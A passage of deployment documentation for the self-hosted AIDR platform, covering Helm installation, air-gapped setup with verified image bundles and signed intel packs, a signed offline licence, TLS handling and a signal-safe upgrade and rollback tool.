Why it matters. Teams that run Kubernetes get chart-managed upgrades, replicas, PodDisruptionBudgets and autoscaling, with their own HA Postgres.

How it works. The chart refuses weak installs. Rendering fails without existing Secrets, with non-https URLs, without a TLS Secret, with a latest image tag, and without complete deep-scan inputs. It never generates secrets. Every pod runs as non-root with seccompProfile: RuntimeDefault, all capabilities dropped and a read-only root filesystem. The one exception is the in-cluster Postgres filesystem. A default-deny NetworkPolicy opens only the flows the stack needs. Egress to the internet is opt-in per purpose. Migrations run as a post-install and then pre-upgrade hook, atomically, with checksum verification.

How to use.

node deploy/helm/build-images.mjs --output .aidr-images --registry registry.example.internal --build --push
node deploy/helm/generate-secrets.mjs --output ~/aidr-credentials --namespace aidr \
  --dashboard-url https://aidr.example.com --api-url https://api.aidr.example.com \
  --artifact-verification-public-key-file release-signing.pub.pem
kubectl apply -f ~/aidr-credentials/platform-secret.yaml -f ~/aidr-credentials/functions-secret.yaml
helm install aidr deploy/helm/aidr --namespace aidr -f my-values.yaml

Validate with pnpm verify:helm. Key values: resourcesPreset (small, medium, large), postgresql.enabled/externalDatabase.*, storage.backend (file or s3), backup.enabled, ingress.tlsSecretName or ingress.certManager.*, networkPolicy.*EgressCIDRs, global.imageRegistry.

Example. helm install with dashboard.image.tag: latest fails at render time instead of deploying an unpinned image.

Availability.

PlanDeploymentPlatforms / OS
Business, EnterpriseOn-prem, Air-gapped (internal registry and npm mirror)Kubernetes 1.25+ with a NetworkPolicy-enforcing CNI, an ingress controller and a StorageClass

Limitations. Not yet exercised on a live cluster, so treat the first install as a staging rehearsal. The chart does not deploy the device-start signer; without it, use enrollment tokens. The readiness evidence worker, SIEM delivery and export-retention timers are not shipped as CronJobs yet. The in-cluster Postgres is a single instance without failover.

Air-gapped installation

What it does. Air-gapped installation runs the on-prem control plane and endpoints with no internet access. Container images, endpoint packages, threat-intelligence packs and the licence all arrive on approved media and are verified offline.

Why it matters. Defence, finance and public-sector networks often forbid any outbound connection, and still need AI-agent controls.

How it works.

  • Images: scripts/build-airgap-images.mjs saves every image of the prepared stack, including Dockerfile FROM base images for local builds, into tarballs with a SHA-256 manifest. --verify re-checks the bundle offline without Docker or network.

  • Endpoint packages: connector and CLI dependencies are vendored into the customer kit. The Linux connector has a signed offline fleet bundle (deploy/fleet/linux/build-offline-bundle.sh).

  • Signed intel packs: scripts/import-offline-pack.mjs verifies the Ed25519 manifest signature, file hashes and expiry. It refuses a rollback to an older version and equivocation (a different pack under an installed version). It then installs the pack for endpoints (--target local) or into the private aidr-packs bucket (--target storage).

  • Licence: the signed offline licence is verified locally, with no activation server.

How to use.

# connected staging host
node scripts/build-airgap-images.mjs --compose .aidr-deploy/compose.yml --output .aidr-airgap --platform linux/amd64
# disconnected host
node scripts/build-airgap-images.mjs --verify --compose .aidr-deploy/compose.yml --output .aidr-airgap
docker load -i .aidr-airgap/tarballs/<name>.tar
node scripts/import-offline-pack.mjs --pack /media/aidr/aidr-intel-2026.09 \
  --trusted-keys /etc/aidr/intel-trusted-keys.json --target local

For Helm, push the images to an internal registry, then set global.imageRegistry and functions.npmRegistry.

Example. One tarball arrives truncated. --verify fails with a size and SHA-256 mismatch before anything is loaded.

Limitations. Delivery integrity is not publisher identity. Notarization, MDM distribution and registry publication remain external steps. Features that need the internet, such as invitation email, cloud IdPs and card billing, are unavailable unless reachable internally.

Signed offline licence

What it does. Self-hosted and air-gapped installations are admitted by a vendor-signed licence file (aidr-license-v1). It carries the seats, validity window, grace days, plan, deployment (onprem or airgap) and features, all under an Ed25519 signature.

Why it matters. The contract terms can no longer be typed in by hand, and a disconnected site can prove its entitlement without phoning home.

How it works. The signature covers aidr-license-v1\n plus the canonical JSON payload, so changing any term breaks it. Unknown fields are refused. Trust comes only from deploy/onprem/license-public-keys.json. The shipped file has no keys, so every licence is refused until the vendor-published registry for your release is installed. Keys can be active, retired (still verifies licences issued in its window) or revoked.

TLS options

What it does. TLS can be handled three ways: public ACME certificates with a renewal timer, customer-supplied certificates in static mode (the usual choice for on-prem and air-gapped hosts), or Kubernetes TLS Secrets and cert-manager.

Why it matters. Agents, browsers and IdPs talk to the control plane over HTTPS, and an expired certificate stops enrollment and telemetry.

How it works.

  • ACME: deploy/ingress/aidr-tls-renew.timer runs scripts/deployment-tls-renew.mjs with Certbot (webroot). It reloads nginx only after the chain, hostname and validity pass and nginx -t succeeds, and it writes a receipt for every attempt.

  • Static (customer CA): deploy/ingress/nginx.onprem.reference.conf has separate dashboard and API vhosts, HSTS and security headers, TLS 1.2 and 1.3 only, no public /metrics, and it rejects unknown hostnames. --mode static validates the chain, hostname, remaining validity (--min-days) and key match, installs atomically, and restores the previous pair if the reload fails.

  • Helm: ingress.tlsSecretName is mandatory, or cert-manager fills it.

How to use.

sudo node /srv/aidr/ingress/deployment-tls-renew.mjs --mode static \
  --hostname api.aidr.customer.example \
  --cert-file /secure-delivery/api-fullchain.pem --key-file /secure-delivery/api-key.pem

Example. An operator supplies a certificate for the wrong hostname. The tool writes a refused receipt and leaves nginx untouched.

Upgrade and rollback

What it does. For Compose, scripts/deployment-upgrade.mjs handles upgrades with the preflight, apply, resume and recover commands, and is signal-safe. For Helm, a helm upgrade runs migrations as a pre-upgrade hook.

Why it matters. An interrupted upgrade that leaves the schema half-applied is the worst outage a control plane can have.

How it works. Preflight verifies every artifact and hash, the append-only migration history, the configuration and a fresh encrypted backup (24 hours old at most by default). It also dry-runs the migrations inside a rolled-back transaction. Apply stops writers, migrates atomically under an advisory lock, installs hash-bound files, keeps .env files and origins, and requires the online doctor to pass. On SIGINT or SIGTERM it stops at the next safe point. Steps that write run to completion. Before the schema commit it restarts the services that were running; after it, it keeps them drained. It records the resumable phase and exits 130 or 143. Every failed apply writes a rollback plan.

How to use.

node scripts/deployment-upgrade.mjs preflight --current /srv/aidr --target /srv/aidr-target \
  --backup /backups/aidr-pre-upgrade --key-file /secure/aidr-recovery.key \
  --contract /secure/aidr-upgrade/upgrade-compatibility.json --recovery-output /srv/aidr-recovery
node scripts/deployment-upgrade.mjs apply ... --maintenance     # same options
node scripts/deployment-upgrade.mjs resume ... --maintenance    # after an interruption

Never rerun preparation over /srv/aidr. Prepare the new release in a new directory.

Example. A change window ends early and the operator sends one SIGTERM during the file install. The tool finishes that step, records interrupted_by, exits 143, and the next resume continues without reapplying migrations.

Availability.

PlanDeploymentPlatforms / OS
Self-hosted plansOn-prem Compose, Air-gapped; Helm via helm upgradeLinux host (Compose); Helm 3 (Kubernetes)

Limitations. Migrations are forward-only. After the schema commits, rollback means restoring the backup into a new isolated project (recover), not a down-migration. On Helm, helm rollback restores manifests, not the schema.
